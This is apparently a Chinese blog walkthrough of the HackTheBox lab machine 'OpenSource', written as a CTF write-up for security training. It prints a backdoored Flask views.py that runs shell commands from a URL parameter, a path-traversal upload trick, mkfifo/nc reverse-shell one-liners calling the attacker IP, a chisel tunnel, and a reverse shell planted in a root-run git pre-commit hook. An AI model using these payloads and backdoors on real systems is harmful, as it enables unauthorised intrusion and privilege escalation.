<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/1k5Zh0CQYZ14R3CNwbwuqw)

 ![](http://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUsGamtQXiblwiaPhT11gUfcWibGaGzbdzpL0N1UGmGdGP78y7DW7sCUOicTibjbBZHrHewj9uP2Tx3yPiaw/0?wx_fmt=png) ** 伏波路上学安全 ** 专注于渗透测试、代码审计等安全技术，分享安全知识. 101篇原创内容   公众号

![图片](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUu85flGuyshLM2ib5FDP8yNpclzWaJC6EBwUgrDZnFk79fHYZcdDoSB8seutTMrk7IruNZ1XfH9Jcw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

```
`靶机信息``靶机地址:``https://app.hackthebox.com/machines/OpenSource``靶场: HackTheBox.com``靶机名称: OpenSource``难度: 简单``提示信息:``无``目标:  user.txt和root.txt`
```

```
`实验环境``攻击机:Vbox Manjaro openvpn 10.10.16.43``靶机：10.10.11.164`
```

信息收集
----

### 扫描端口

扫描靶机开放的服务端口

```
sudo nmap 10.10.11.164
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

  

```
sudo nmap -sC -sV -p 22,80 10.10.11.164 -oN nmap.log
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

  

扫描到22、80和3000端口开放，其中3000端口有防火墙拦截，先来看看80端口。

Web渗透
-----

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

找到下载和上传两个链接，先来看看下载

```
wget http://10.10.11.164/download -O download.zip
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

  

下载后解压检查内容

```
`unzip -d download download.zip``cd download` `ls -al`
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

  

解压后发现是站点的源码，并且该程序是在容器中运行的（通过build-docker.sh脚本和dockerfile目录判断），还发现.git目录，使用GitTools来恢复.git目录找找敏感信息。

GitTools下载地址：

```
https://github.com/internetwache/GitTools
```

下载后执行Extractor下的extractor.sh，我的攻击机在之前就下载过了，看下路径  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

提前创建好要输出的目录，再执行恢复(在普通用户身份下无法执行extractor使用sudo也一样，切换到root账号即可，有可能是Manjaro的问题)

```
`sudo su``mkdir gitout``extractor download/ gitout/`
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

  

在1-a76f8f75f7a4a12b706b0cf9c983796fa1985820/app/.vscode目录下的settings.json中发现一组账号密码

```
cat settings.json
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

  

尝试登录SSH

```
ssh dev01@10.10.11.164
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

  

SSH不允许使用密码登录，先保存下来。再来看下程序源码

```
ls -al
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

  

在app目录下发现views.py，检查内容

```
cat views.py
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

  

发现上传文件函数调用了utils中的get_file_name，来看看utils中的内容

```
cat utils.py
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

  

utils.py脚本中的get_file_name调用了recursive_replace函数，recursive_replace使用replace循环过滤”../“。尝试绕过这个过滤。

### 文件上传漏洞

思路：

1。将命令执行代码添加到views.py中  
2。通过文件上传漏洞将views.py替换原有的views.py  
3。攻击机监听4444端口，并在靶机上执行反弹shell命令

1。views.py中添加反弹shell代码

```
`import os``from app.utils import get_file_name``from flask import render_template, request, send_file``from app import app``@app.route('/', methods=['GET', 'POST'])``def upload_file():` `if request.method == 'POST':` `f = request.files['file']` `file_name = get_file_name(f.filename)` `file_path = os.path.join(os.getcwd(), "public", "uploads", file_name)` `f.save(file_path)` `return render_template('success.html', file_url=request.host_url + "uploads/" + file_name)` `return render_template('upload.html')``@app.route('/uploads/<path:path>')``def send_report(path):` `path = get_file_name(path)` `return send_file(os.path.join(os.getcwd(), "public", "uploads", path))``@app.route('/rs')``def rs():` `return os.system(request.args.get('cmd'))`
```

2。使用burpsuite抓取上传views.py时的数据包  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

修改数据包中的文件名上传到指定的路径

```
`原内容：``Content-Disposition: form-data;` `修改后：``Content-Disposition: form-data;` 
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

  

修改后将这个包放行，再到攻击机上监听4444端口

```
nc -lnvp 4444
```

再来执行payload  

```
http://10.10.11.164/rs?cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.43 4444 >/tmp/f
```

需要url编码  

```
http://10.10.11.164/rs?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff|%2Fbin%2Fsh%20-i%202%3E%261|nc%2010.10.16.43%204444%20%3E%2Ftmp%2Ff
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

  

反弹成功，之前在查看源码时知道程序是运行在容器中的，所以要想办法访问物理机

```
echo;id;echo;ip a;echo
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

  

当前是root用户，ip地址为172.17.0.5，之前nmap扫描时发现一个3000端口被防火墙拦截了，先来检查下容器中能不能访问物理机的3000端口

```
nc -nv 172.17.0.1 3000
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

  

可以访问，做个反向代理到攻击机中，再详细检查3000端口

反向代码chisel工具仓库

```
https://github.com/jpillora/chisel
```

攻击机下载chisel并运行服务端  

```
`wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz``gunzip chisel_1.7.7_linux_amd64.gz``./chisel_1.7.7_linux_amd64 server --reverse --port 3333`
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

  

将chisel上传到靶机中并执行客户端命令

1。攻击机在chisel目录下开启HTTP服务

```
py3 -m http.server
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

  

2。靶机下载chisel并运行

```
`wget http://10.10.16.43:8000/chisel_1.7.7_linux_amd64``chmod +x chisel_1.7.7_linux_amd64``./chisel_1.7.7_linux_amd64 client 10.10.16.43:3333 R:socks`
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

连接成功，并且在本地开放了1080代理端口，使用代理检查3000端口

```
http://172.17.0.1:3000/
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

  

访问后是一个代码托管程序，右上角发现注册和登录功能，用之前拿到的dev01账号登录试试

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

登录成功，发现home-backup，并且在.ssh目录下发现了id_rsa文件，将key保存下来登录SSH（放到home目录的原因是文件存在共享目录中无法修改权限 ）

```
`nano ~/id_rsa``chmod 600 ~/id_rsa``ssh dev01@10.10.11.164 -i ~/id_rsa`
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

  

登录成功，来找找敏感信息

```
`ls``cat user.txt`
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

  

刚登录进来发现有一个pspy64程序，也不知道是靶机上带的还是其他打靶的人留下的，运行下看看(如果没有就自己上传一个)

```
./pspy64
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

发现后台有脚本以root身份每分钟执行一次git提交，来找找这个脚本

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

这个脚本我们有读写权限，直接来添加反弹shell

```
nano pre-commit
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

发现这里有人对/bin/bash添加了suid权限，应该是其他打靶的人留下的，不管他按自己的路线来

1。在pre-commit中添加反弹shell代码

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.16.43 4444 >/tmp/f
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

2。攻击机监听4444端口

```
nc -lvvp 4444
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

反弹成功，来找找flag

```
`cd /root``ls``cat root.txt`
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

拿到root.txt，游戏结束。

说一下HTB靶场发现的问题，因为有多人同时在打同一个靶机所以经常会被重置，而且靶机内会有其他人留下的打靶痕迹，可能在线靶场都有这种问题。

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)